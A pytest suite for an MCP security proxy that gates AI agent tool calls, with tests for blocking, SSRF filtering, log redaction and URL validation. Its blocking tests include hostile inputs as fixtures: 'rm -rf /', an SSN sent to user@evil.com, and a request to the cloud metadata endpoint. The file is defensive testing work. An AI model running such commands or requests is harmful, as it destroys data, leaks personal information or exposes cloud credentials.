# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Tests for the MCP proxy (mcp_proxy.py).

Run:
    cd edge-connector
    python -m pytest tests/test_mcp_proxy.py -v
"""
from __future__ import annotations

import asyncio
import json
import logging
import sys
from pathlib import Path
from typing import Any, Dict, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Ensure the tools directory is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))

from generic_hook import ACTION_ALLOW, ACTION_BLOCK, Verdict
from mcp_proxy import (
    MCPProxy,
    ProxyConfig,
    SecurityGate,
    _HttpUpstream,
    _StdioUpstream,
    _encode,
    _handle_stdio_line,
    _log_non_json_stdio_line,
    _make_error,
)


# -----------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------

def _tool_call_msg(tool_name: str, arguments: Dict[str, Any],
                   req_id: int = 1) -> Dict:
    """Build a minimal MCP tools/call request."""
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "tools/call",
        "params": {"name": tool_name, "arguments": arguments},
    }


def _tools_list_msg(req_id: int = 2) -> Dict:
    return {"jsonrpc": "2.0", "id": req_id, "method": "tools/list", "params": {}}


def _initialize_msg(req_id: int = 3) -> Dict:
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "test", "version": "0.1"},
        },
    }


def _make_proxy(
    *,
    verdict: Optional[Verdict] = None,
    upstream_response: Optional[Dict] = None,
) -> MCPProxy:
    """Create an MCPProxy with mocked gate and upstream."""
    config = ProxyConfig(
        upstream_transport="stdio",
        upstream_command=["echo"],
        fail_mode="closed",
    )
    proxy = MCPProxy.__new__(MCPProxy)
    proxy._config = config

    # Mock the security gate
    gate = MagicMock(spec=SecurityGate)
    if verdict is not None:
        gate.evaluate_tool_call.return_value = verdict
    else:
        gate.evaluate_tool_call.return_value = Verdict.allow()
    proxy._gate = gate

    # Mock the upstream
    upstream = AsyncMock()
    if upstream_response is not None:
        upstream.send.return_value = upstream_response
    else:
        upstream.send.return_value = {
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"content": [{"type": "text", "text": "ok"}]},
        }
    proxy._upstream = upstream

    return proxy


# -----------------------------------------------------------------------
# JSON-RPC helpers
# -----------------------------------------------------------------------

class TestJsonRpcHelpers:
    def test_make_error(self):
        err = _make_error(42, -32001, "blocked", {"tool": "exec"})
        assert err["jsonrpc"] == "2.0"
        assert err["id"] == 42
        assert err["error"]["code"] == -32001
        assert err["error"]["message"] == "blocked"
        assert err["error"]["data"]["tool"] == "exec"

    def test_make_error_no_data(self):
        err = _make_error(1, -32600, "bad request")
        assert "data" not in err["error"]

    def test_encode_produces_newline_delimited_json(self):
        msg = {"jsonrpc": "2.0", "id": 1, "method": "ping"}
        encoded = _encode(msg)
        assert encoded.endswith(b"\n")
        decoded = json.loads(encoded)
        assert decoded["method"] == "ping"


# -----------------------------------------------------------------------
# ProxyConfig
# -----------------------------------------------------------------------

class TestProxyConfig:
    def test_from_env_stdio(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", '["python3", "server.py"]')
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "stdio")
        monkeypatch.setenv("DCLAW_FAIL_OPEN", "1")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "stdio"
        assert cfg.upstream_command == ["python3", "server.py"]
        assert cfg.fail_mode == "open"

    def test_from_env_http(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", "https://1.1.1.1:8088/mcp")
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "http")
        monkeypatch.setenv("DCLAW_MCP_PORT", "9999")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "http"
        assert cfg.upstream_url == "https://1.1.1.1:8088/mcp"
        assert cfg.http_port == 9999

    def test_from_env_defaults(self, monkeypatch):
        monkeypatch.delenv("DCLAW_MCP_UPSTREAM", raising=False)
        monkeypatch.delenv("DCLAW_MCP_TRANSPORT", raising=False)
        monkeypatch.delenv("DCLAW_FAIL_OPEN", raising=False)

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "stdio"
        assert cfg.fail_mode == "closed"

    def test_from_env_string_command(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", "python3 server.py --verbose")
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "stdio")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_command == ["python3", "server.py", "--verbose"]


# -----------------------------------------------------------------------
# Tool call interception — ALLOW
# -----------------------------------------------------------------------

class TestToolCallAllow:
    @pytest.mark.asyncio
    async def test_allowed_tool_call_forwarded(self):
        upstream_resp = {
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"content": [{"type": "text", "text": "temperature: 22C"}]},
        }
        proxy = _make_proxy(
            verdict=Verdict.allow(),
            upstream_response=upstream_resp,
        )

        msg = _tool_call_msg("get_temperature", {"sensor_id": "A1"})
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "result" in resp
        assert resp["result"]["content"][0]["text"] == "temperature: 22C"

        # Verify the gate was called for request and response
        assert proxy._gate.evaluate_tool_call.call_count == 2
        proxy._gate.evaluate_tool_call.assert_any_call(
            "get_temperature", {"sensor_id": "A1"},
        )
        # Verify the message was forwarded to upstream
        proxy._upstream.send.assert_called_once_with(msg)

    @pytest.mark.asyncio
    async def test_allowed_tool_call_preserves_request_id(self):
        proxy = _make_proxy(verdict=Verdict.allow())
        proxy._upstream.send.return_value = {
            "jsonrpc": "2.0", "id": 99, "result": {},
        }

        msg = _tool_call_msg("read_sensor", {}, req_id=99)
        resp = await proxy.handle_message(msg)
        assert resp["id"] == 99


# -----------------------------------------------------------------------
# Tool call interception — BLOCK
# -----------------------------------------------------------------------

class TestToolCallBlock:
    @pytest.mark.asyncio
    async def test_blocked_tool_call_returns_error(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x04),  # HASH_DENY
        )

        msg = _tool_call_msg("exec_shell", {"command": "rm -rf /"})
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32001
        assert "HASH_DENY" in resp["error"]["message"]
        assert resp["error"]["data"]["tool"] == "exec_shell"
        assert resp["error"]["data"]["action"] == "block"

        # Verify upstream was NOT called
        proxy._upstream.send.assert_not_called()

    @pytest.mark.asyncio
    async def test_blocked_tool_call_preserves_request_id(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x05),  # RATE_LIMIT
        )
        msg = _tool_call_msg("run_command", {"cmd": "whoami"}, req_id=42)
        resp = await proxy.handle_message(msg)

        assert resp["id"] == 42
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_blocked_content_scan(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x0C),  # CONTENT_BLOCK
        )
        msg = _tool_call_msg(
            "send_message",
            {"to": "user@evil.com", "body": "SSN: 123-45-6789"},
        )
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert "CONTENT_BLOCK" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_blocked_ssrf(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x0D),  # SSRF_BLOCK
        )
        msg = _tool_call_msg(
            "http_request",
            {"url": "http://169.254.169.254/latest/meta-data/"},
        )
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert "SSRF_BLOCK" in resp["error"]["message"]


# -----------------------------------------------------------------------
# Passthrough for non-tool messages
# -----------------------------------------------------------------------

class TestPassthrough:
    @pytest.mark.asyncio
    async def test_tools_list_forwarded(self):
        tools_resp = {
            "jsonrpc": "2.0",
            "id": 2,
            "result": {"tools": [{"name": "get_temp"}, {"name": "start_motor"}]},
        }
        proxy = _make_proxy(upstream_response=tools_resp)

        msg = _tools_list_msg()
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "result" in resp
        assert len(resp["result"]["tools"]) == 2

        # Gate should NOT have been called
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_initialize_forwarded(self):
        init_resp = {
            "jsonrpc": "2.0",
            "id": 3,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {"name": "test-server", "version": "0.1"},
            },
        }
        proxy = _make_proxy(upstream_response=init_resp)

        msg = _initialize_msg()
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert resp["result"]["serverInfo"]["name"] == "test-server"
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_resources_read_forwarded(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 4,
            "result": {"contents": [{"uri": "file:///tmp/a.txt", "text": "hello"}]},
        })

        msg = {
            "jsonrpc": "2.0", "id": 4,
            "method": "resources/read",
            "params": {"uri": "file:///tmp/a.txt"},
        }
        resp = await proxy.handle_message(msg)

        assert "result" in resp
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_prompts_get_forwarded(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 5,
            "result": {"messages": [{"role": "user", "content": {"type": "text", "text": "hi"}}]},
        })

        msg = {
            "jsonrpc": "2.0", "id": 5,
            "method": "prompts/get",
            "params": {"name": "greeting"},
        }
        resp = await proxy.handle_message(msg)

        assert "result" in resp
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_notification_forwarded_no_response(self):
        proxy = _make_proxy()

        notification = {
            "jsonrpc": "2.0",
            "method": "notifications/cancelled",
            "params": {"requestId": 10},
        }
        resp = await proxy.handle_message(notification)

        # Notifications have no id, so no response is returned
        assert resp is None
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_unknown_method_blocked(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 6, "result": {"ok": True},
        })

        msg = {"jsonrpc": "2.0", "id": 6, "method": "custom/method", "params": {}}
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert resp["error"]["code"] == -32601
        proxy._gate.evaluate_tool_call.assert_not_called()


# -----------------------------------------------------------------------
# Error handling
# -----------------------------------------------------------------------

class TestErrorHandling:
    @pytest.mark.asyncio
    async def test_upstream_unavailable_on_passthrough(self):
        proxy = _make_proxy()
        proxy._upstream.send.side_effect = ConnectionError("process died")

        msg = _tools_list_msg(req_id=10)
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert resp["error"]["code"] == -32603
        assert "Upstream unavailable" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_upstream_unavailable_on_allowed_tool_call(self):
        proxy = _make_proxy(verdict=Verdict.allow())
        proxy._upstream.send.side_effect = ConnectionError("refused")

        msg = _tool_call_msg("read_sensor", {"id": 1})
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert resp["error"]["code"] == -32603

    @pytest.mark.asyncio
    async def test_notification_upstream_error_ignored(self):
        proxy = _make_proxy()
        proxy._upstream.send.side_effect = ConnectionError("down")

        notification = {
            "jsonrpc": "2.0",
            "method": "notifications/progress",
            "params": {"token": "abc"},
        }
        # Should not raise
        resp = await proxy.handle_message(notification)
        assert resp is None


@pytest.mark.parametrize("msg,expected_code,expected_id", [
    (42, -32600, None),
    ([], -32600, None),
    ("secret-marker", -32600, None),
    ({"id": 1, "method": 42}, -32600, 1),
    ({"id": 2, "method": "tools/call", "params": []}, -32600, 2),
    ({"id": 3, "method": "tools/call", "params": None}, -32600, 3),
    ({"id": 4, "method": "tools/call", "params": {"name": "read_sensor", "arguments": []}}, -32602, 4),
    ({"id": "x" * 129, "method": "ping"}, -32600, None),
])
@pytest.mark.asyncio
async def test_malformed_inbound_json_fails_closed(msg, expected_code, expected_id):
    proxy = _make_proxy()
    response = await proxy.handle_message(msg)
    assert response["error"]["code"] == expected_code
    assert response["id"] == expected_id
    proxy._gate.evaluate_tool_call.assert_not_called()
    proxy._upstream.send.assert_not_called()


@pytest.mark.asyncio
async def test_stdio_scalar_frames_do_not_stop_next_request_or_notification():
    proxy = _make_proxy(upstream_response={"jsonrpc": "2.0", "id": 8, "result": {"ok": True}})
    for raw in (b"42\n", b"[]\n", b'{"id":7,"method":42}\n'):
        response = json.loads(await _handle_stdio_line(proxy, raw))
        assert response["error"]["code"] == -32600
    response = json.loads(await _handle_stdio_line(proxy, b'{"jsonrpc":"2.0","id":8,"method":"ping"}\n'))
    assert response["result"] == {"ok": True}
    assert await _handle_stdio_line(proxy, b'{"jsonrpc":"2.0","method":"notifications/progress","params":{}}\n') is None
    assert proxy._upstream.send.await_count == 2


@pytest.mark.parametrize("line", [
    b"Bearer secret-marker\n",
    b"\xff\n",
    b"9" * 5000 + b"\n",
    b"[" * 20000 + b"]" * 20000 + b"\n",
])
@pytest.mark.asyncio
async def test_stdio_parse_failures_return_bounded_error_without_payload_log(line, caplog):
    proxy = _make_proxy()
    with caplog.at_level(logging.WARNING, logger="defenseclaw.mcp_proxy"):
        response = json.loads(await _handle_stdio_line(proxy, line))
    assert response == {
        "jsonrpc": "2.0", "id": None,
        "error": {"code": -32700, "message": "Parse error"},
    }
    assert "secret-marker" not in caplog.text
    assert len(caplog.text) < 200
    proxy._gate.evaluate_tool_call.assert_not_called()
    proxy._upstream.send.assert_not_called()


@pytest.mark.asyncio
async def test_logged_method_and_tool_names_cannot_inject_log_lines(caplog):
    proxy = _make_proxy()
    with caplog.at_level(logging.INFO, logger="defenseclaw.mcp_proxy"):
        rejected = await proxy.handle_message({"id": 1, "method": "custom/secret-marker\nFORGED"})
        assert rejected["error"]["code"] == -32601
        await proxy.handle_message(_tool_call_msg("read_sensor\nFORGED", {}))
    assert "secret-marker" not in caplog.text
    assert "read_sensor\\nFORGED" in caplog.text
    assert "read_sensor\nFORGED" not in caplog.text


# -----------------------------------------------------------------------
# MCPProxy construction
# -----------------------------------------------------------------------

class TestProxyConstruction:
    @patch("mcp_proxy.SecurityGate")
    def test_raises_without_upstream(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="stdio",
            upstream_command=None,
            upstream_url=None,
        )
        with pytest.raises(ValueError, match="No upstream configured"):
            MCPProxy(config)

    @patch("mcp_proxy.SecurityGate")
    def test_stdio_upstream_created(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="stdio",
            upstream_command=["python3", "server.py"],
        )
        proxy = MCPProxy(config)
        assert isinstance(proxy._upstream, _StdioUpstream)

    @patch("mcp_proxy.SecurityGate")
    def test_http_upstream_created(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="http",
            upstream_url="https://1.1.1.1:8088/mcp",
        )
        proxy = MCPProxy(config)
        assert isinstance(proxy._upstream, _HttpUpstream)


@pytest.mark.parametrize("command,error_type", [
    (["secret-marker-unavailable"], FileNotFoundError),
    ([sys.executable, "secret-marker;"], ValueError),
    ([sys.executable, 42], ValueError),
])
def test_stdio_command_validation_does_not_echo_arguments(command, error_type):
    with pytest.raises(error_type) as excinfo:
        _StdioUpstream(command)
    assert "secret-marker" not in str(excinfo.value)


def test_stdio_command_accepts_empty_non_executable_argument():
    upstream = _StdioUpstream([sys.executable, ""])
    assert upstream._command == [sys.executable, ""]


@pytest.mark.parametrize("check,error_type", [
    ("isfile", ValueError),
    ("access", PermissionError),
])
def test_stdio_command_file_errors_do_not_echo_executable(check, error_type):
    target = "mcp_proxy.os.path.isfile" if check == "isfile" else "mcp_proxy.os.access"
    with patch("shutil.which", return_value=sys.executable), patch(target, return_value=False):
        with pytest.raises(error_type) as excinfo:
            _StdioUpstream([sys.executable])
    assert sys.executable not in str(excinfo.value)


@pytest.mark.asyncio
async def test_stdio_upstream_start_log_does_not_echo_arguments(caplog):
    upstream = _StdioUpstream([sys.executable, "-c", "pass", "secret-marker"])
    with caplog.at_level(logging.INFO, logger="defenseclaw.mcp_proxy"):
        await upstream.start()
        try:
            assert "Upstream started (pid=" in caplog.text
            assert "secret-marker" not in caplog.text
        finally:
            await upstream.stop()


@pytest.mark.asyncio
async def test_stdio_upstream_error_log_does_not_echo_payload(caplog):
    proxy = _make_proxy()
    proxy._upstream.send.side_effect = OSError("secret-marker")
    with caplog.at_level(logging.ERROR, logger="defenseclaw.mcp_proxy"):
        response = await proxy._forward({"id": 1})
    assert response["error"]["message"] == "Upstream unavailable"
    assert "Upstream stdio error: OSError" in caplog.text
    assert "secret-marker" not in caplog.text


@pytest.mark.parametrize("url", [
    "http://localhost:8088/mcp",
    "http://localhost.:8088/mcp",
    "http://device.localhost:8088/mcp",
    "http://localhost.localdomain:8088/mcp",
    "http://127.0.0.1:8088/mcp",
    "http://[::1]:8088/mcp",
    "http://127.1:8088/mcp",
    "http://0177.0.0.1:8088/mcp",
    "http://0x7f000001:8088/mcp",
    "http://2130706433:8088/mcp",
    "ftp://1.1.1.1/mcp",
    "https://user:pass@1.1.1.1/mcp",
])
def test_http_upstream_rejects_loopback_aliases_and_unsafe_urls(url):
    with pytest.raises(ValueError):
        _HttpUpstream(url)


@pytest.mark.parametrize("url,production", [
    ("https://1.1.1.1\\bad/mcp?token=secret-marker", False),
    ("https:///mcp?token=secret-marker", False),
    ("http://1.1.1.1/mcp?token=secret-marker", True),
])
def test_http_upstream_validation_does_not_echo_url_secret(url, production, monkeypatch):
    if production:
        monkeypatch.setenv("DCLAW_PRODUCTION", "true")
    with pytest.raises(ValueError) as excinfo:
        _HttpUpstream(url)
    assert "secret-marker" not in str(excinfo.value)


@pytest.mark.asyncio
async def test_http_upstream_start_log_redacts_path_query_and_fragment(caplog):
    upstream = _HttpUpstream("https://1.1.1.1/private-path?token=secret-marker#secret-fragment")
    with caplog.at_level(logging.INFO, logger="defenseclaw.mcp_proxy"):
        await upstream.start()
        try:
            assert "Upstream HTTP: https://1.1.1.1" in caplog.text
            assert "private-path" not in caplog.text
            assert "secret-marker" not in caplog.text
            assert "secret-fragment" not in caplog.text
        finally:
            await upstream.stop()


@pytest.mark.asyncio
async def test_http_upstream_error_log_redacts_exception_url(caplog):
    upstream = _HttpUpstream("https://1.1.1.1/mcp?token=secret-marker")
    upstream._session = MagicMock()
    upstream._session.post.side_effect = OSError("https://1.1.1.1/mcp?token=secret-marker")
    proxy = MCPProxy.__new__(MCPProxy)
    proxy._upstream = upstream
    with caplog.at_level(logging.ERROR, logger="defenseclaw.mcp_proxy"):
        response = await proxy._forward({"id": 1})
    assert response["error"]["message"] == "Upstream unavailable"
    assert "Upstream HTTP error: OSError" in caplog.text
    assert "secret-marker" not in caplog.text


@pytest.mark.asyncio
async def test_malformed_upstream_response_is_not_logged(caplog):
    proxy = _make_proxy(upstream_response={
        "result": {"content": [{"text": "secret-marker"}]},
    })
    with caplog.at_level(logging.WARNING, logger="defenseclaw.mcp_proxy"):
        response = await proxy._forward({"id": 1})
    assert response["error"]["message"] == "Upstream returned invalid response"
    assert "Upstream returned malformed JSON-RPC response" in caplog.text
    assert "secret-marker" not in caplog.text


def test_non_json_stdio_input_is_not_logged(caplog):
    with caplog.at_level(logging.WARNING, logger="defenseclaw.mcp_proxy"):
        _log_non_json_stdio_line(b"Bearer secret-marker\n")
    assert "Ignoring non-JSON stdio message (21 bytes)" in caplog.text
    assert "secret-marker" not in caplog.text


@pytest.mark.asyncio
async def test_http_upstream_rejects_private_dns_answer(monkeypatch):
    """A public-looking hostname cannot resolve to a private target."""
    import aiohttp.resolver

    async def private_answer(_self, host, port=0, family=0):
        return [{"hostname": host, "host": "127.0.0.1", "port": port,
                 "family": family, "proto": 0, "flags": 0}]

    monkeypatch.setattr(aiohttp.resolver.DefaultResolver, "resolve", private_answer)
    upstream = _HttpUpstream("http://reviewed.example:18088/mcp")
    await upstream.start()
    try:
        with pytest.raises((OSError, aiohttp.ClientError)):
            await upstream.send({"jsonrpc": "2.0", "method": "initialize"})
    finally:
        await upstream.stop()


@pytest.mark.asyncio
async def test_http_upstream_does_not_follow_redirects():
    upstream = _HttpUpstream("https://1.1.1.1/mcp")
    response = MagicMock()
    response.json = AsyncMock(return_value={"ok": True})
    context = MagicMock()
    context.__aenter__ = AsyncMock(return_value=response)
    context.__aexit__ = AsyncMock(return_value=False)
    upstream._session = MagicMock()
    upstream._session.post.return_value = context
    assert await upstream.send({"id": 1}) == {"ok": True}
    assert upstream._session.post.call_args.kwargs["allow_redirects"] is False


# -----------------------------------------------------------------------
# SecurityGate
# -----------------------------------------------------------------------

class TestSecurityGate:
    @patch("mcp_proxy.EdgeConnector")
    def test_gate_calls_edge_connector(self, mock_ec_cls):
        mock_ec = MagicMock()
        mock_ec.evaluate.return_value = Verdict.allow()
        mock_ec_cls.return_value = mock_ec

        config = ProxyConfig(fail_mode="closed")
        gate = SecurityGate(config)
        v = gate.evaluate_tool_call("read_file", {"path": "/etc/hosts"})

        assert v.blocked is False
        mock_ec.evaluate.assert_called_once_with(
            tool_name="read_file",
            arguments={"path": "/etc/hosts"},
            direction="request",
        )

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_shutdown(self, mock_ec_cls):
        mock_ec = MagicMock()
        mock_ec_cls.return_value = mock_ec

        config = ProxyConfig(fail_mode="open")
        gate = SecurityGate(config)
        gate.shutdown()
        mock_ec.shutdown.assert_called_once()

    @patch("mcp_proxy.fail_open_attested", return_value=True)
    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_open_config(self, mock_ec_cls, _attested):
        config = ProxyConfig(fail_mode="open")
        SecurityGate(config)
        mock_ec_cls.assert_called_once_with(
            lib_path=None,
            socket_path=None,
            fail_open=True,
        )

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_open_requires_attestation(self, mock_ec_cls, monkeypatch):
        monkeypatch.delenv("DCLAW_DEV_MODE", raising=False)
        monkeypatch.setattr("generic_hook._FAIL_OPEN_TOKEN", "")
        SecurityGate(ProxyConfig(fail_mode="open"))
        mock_ec_cls.assert_called_once_with(
            lib_path=None,
            socket_path=None,
            fail_open=False,
        )

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_open_rejects_bad_token(self, mock_ec_cls, monkeypatch):
        monkeypatch.delenv("DCLAW_DEV_MODE", raising=False)
        monkeypatch.setenv("DCLAW_AUDIT_KEY", "11" * 32)
        monkeypatch.setattr("generic_hook._FAIL_OPEN_TOKEN", "00" * 32)
        SecurityGate(ProxyConfig(fail_mode="open"))
        assert mock_ec_cls.call_args.kwargs["fail_open"] is False

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_open_accepts_valid_token(self, mock_ec_cls, monkeypatch):
        import hashlib
        import hmac
        key = "11" * 32
        token = hmac.new(bytes.fromhex(key), b"fail-open-authorized",
                         hashlib.sha256).hexdigest()
        monkeypatch.delenv("DCLAW_DEV_MODE", raising=False)
        monkeypatch.setenv("DCLAW_AUDIT_KEY", key)
        monkeypatch.setattr("generic_hook._FAIL_OPEN_TOKEN", token)
        SecurityGate(ProxyConfig(fail_mode="open"))
        assert mock_ec_cls.call_args.kwargs["fail_open"] is True

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_closed_config(self, mock_ec_cls):
        config = ProxyConfig(fail_mode="closed")
        SecurityGate(config)
        mock_ec_cls.assert_called_once_with(
            lib_path=None,
            socket_path=None,
            fail_open=False,
        )


# -----------------------------------------------------------------------
# Stdio upstream framing
# -----------------------------------------------------------------------

_FAKE_UPSTREAM = r'''
import json, sys
if "--stderr" in sys.argv:
    sys.stderr.write("x" * (1024 * 1024))
    sys.stderr.flush()
for line in sys.stdin:
    msg = json.loads(line)
    if "id" not in msg:
        continue
    if "--chatty" in sys.argv:
        # A notification, a server->client request and a stray reply,
        # all before the real answer.
        print(json.dumps({"jsonrpc": "2.0", "method": "notifications/message",
                          "params": {"level": "info", "data": "hi"}}))
        print(json.dumps({"jsonrpc": "2.0", "id": "srv-1", "method": "roots/list"}))
        print(json.dumps({"jsonrpc": "2.0", "id": "other", "result": {}}))
        sys.stdout.flush()
        reply = json.loads(sys.stdin.readline())  # proxy's answer to srv-1
        assert reply["id"] == "srv-1" and reply["error"]["code"] == -32601
    print(json.dumps({"jsonrpc": "2.0", "id": msg["id"],
                      "result": {"echo": msg["id"]}}))
    sys.stdout.flush()
'''


@pytest.fixture
def fake_upstream_script():
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        path = Path(d) / "fake_upstream.py"
        path.write_text(_FAKE_UPSTREAM)
        yield str(path)


async def _fake_upstream(script, *flags):
    upstream = _StdioUpstream([sys.executable, script, *flags])
    await upstream.start()
    return upstream


@pytest.mark.asyncio
async def test_stdio_upstream_skips_notifications_and_other_ids(fake_upstream_script):
    upstream = await _fake_upstream(fake_upstream_script, "--chatty")
    try:
        for req_id in (3, "abc", 4):
            resp = await asyncio.wait_for(
                upstream.send({"jsonrpc": "2.0", "id": req_id, "method": "ping"}), 10)
            assert resp["id"] == req_id
            assert resp["result"] == {"echo": req_id}
    finally:
        await upstream.stop()


@pytest.mark.asyncio
async def test_stdio_upstream_stderr_flood_does_not_deadlock(fake_upstream_script):
    upstream = await _fake_upstream(fake_upstream_script, "--stderr")
    try:
        resp = await asyncio.wait_for(
            upstream.send({"jsonrpc": "2.0", "id": 1, "method": "initialize"}), 10)
        assert resp["result"] == {"echo": 1}
    finally:
        await upstream.stop()


@pytest.mark.parametrize("raw,rejects", [("on", True), (" TRUE ", True), ("yes", True),
                                         ("0", False), ("off", False)])
def test_http_upstream_production_flag_matches_go_parser(raw, rejects, monkeypatch):
    monkeypatch.setenv("DCLAW_PRODUCTION", raw)
    if rejects:
        with pytest.raises(ValueError, match="plaintext HTTP"):
            _HttpUpstream("http://1.1.1.1/mcp")
    else:
        _HttpUpstream("http://1.1.1.1/mcp")
